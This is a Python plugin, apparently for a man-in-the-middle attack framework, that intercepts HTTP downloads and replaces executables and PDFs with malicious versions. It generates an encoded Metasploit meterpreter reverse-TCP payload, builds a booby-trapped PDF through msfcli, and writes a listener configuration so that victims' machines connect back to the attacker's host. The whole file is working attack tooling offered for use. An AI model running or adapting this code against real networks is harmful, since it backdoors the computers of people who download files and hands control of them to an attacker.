import os,subprocess,logging,time
from bdfproxy.bdf_proxy import *
exe_mimetypes = ['application/octet-stream', 'application/x-msdownload', 'application/exe', 'application/x-exe', 'application/dos-exe', 'vms/exe', 'application/x-winexe', 'application/msdos-windows', 'application/x-msdos-program']

class FilePwn(Plugin):
    name = "FilePwn"
    optname = "filepwn"
    implements = ["handleResponse"]
    has_opts = True
    log_level = logging.DEBUG
    desc = "Backdoor files being sent over http unsing bdproxy"
    def initialize(self,options):
        '''Called if plugin is enabled, passed the options namespace'''
        self.options = options
        self.msf_file_payload_opts = "LHOST=%s LPORT=%s" % \
                                      (options.msf_lhost,options.msf_file_lport)
        self.payloads = {}
        self._make_files()
        if options.launch_msf_listener and options.msf_rc == "/tmp/tmp.rc":
            self._start_msf()
    def _start_msf(self):
        f = open("/tmp/tmp.rc","a")
        f.write('''
                use multi/handler
                set PAYLOAD %s
                set LHOST %s
                set LPORT %s
                set ExistOnSession false
                exploit -j
        ''' % (self.options.msf_file_payload,self.options.msf_lhost,
            self.options.msf_file_lport))
        f.close()
        
    def _make_files(self):
        self.exe_made = False
        if self.options.exe:
            self._make_exe()
        if self.options.pdf:
            self._make_pdf()

    def _make_exe(self):
        if self.options.exe_file == None:
            logging.info("Generating our executable...")
            msfp = os.path.join(self.options.msf_path,"msfpayload") + " %s %s"
            msfe = os.path.join(self.options.msf_path,"msfencode") + " %s"
            payload = msfp%(self.options.msf_file_payload,self.msf_file_payload_opts)
            encode = msfe % "-t exe -o /tmp/tmp.exe -e x86/shikata_ga_nai -c 8"
            #print payload+" R |"+encode
            os.system(payload+" R |"+encode)
            self.exe_made = True
            self.exe = "/tmp/tmp.exe"
        else:
            self.exe = self.options.exe_file
        self.exe_payload = open(self.exe,"rb").read()
        if self.options.exe:
            for m in exe_mimetypes:
                self.payloads[m] = self.exe_payload

    def _make_pdf(self):
        logging.info("Generating our PDF...")
        if self.options.pdf_exploit.find("embedded_exe") != -1:
            if not self.exe_made:
                self._make_exe()
            if self.msf_file_payload_opts.find("EXEFILE") == -1:
                self.msf_file_payload_opts += " EXEFILE=" + self.exe
        if self.msf_file_payload_opts.find("INFILENAME") == -1:
            self.msf_file_payload_opts += " INFILENAME=" + \
                                                  os.path.join(self.options.full_path,"data/blank.pdf")
        self.msf_file_payload_opts += " FILENAME=/tmp/tmp.pdf"
        msfc = os.path.join(self.options.msf_path,"msfcli") + " %s %s E"
        os.system(msfc % (self.options.pdf_exploit,self.msf_file_payload_opts))
        self.payloads['application/pdf'] = open("/tmp/tmp.pdf","rb").read()
    
    def handleResponse(self,request,data):
        #print "http://" + request.client.getRequestHostname() + request.uri
        ch = request.client.headers['Content-Type']
        #print ch
        if ch in self.payloads:
            print "Replaced file of mimtype %s with malicious version" % ch
            data = self.payloads[ch]
            return {'request':request,'data':data}
        else:
            return

    def add_options(self,options):
        options.add_argument("--msf-file-payload",type=str,default="windows/meterpreter/reverse_tcp",
                help="Payload you want to use (default: windows/meterpreter/reverse_tcp)")
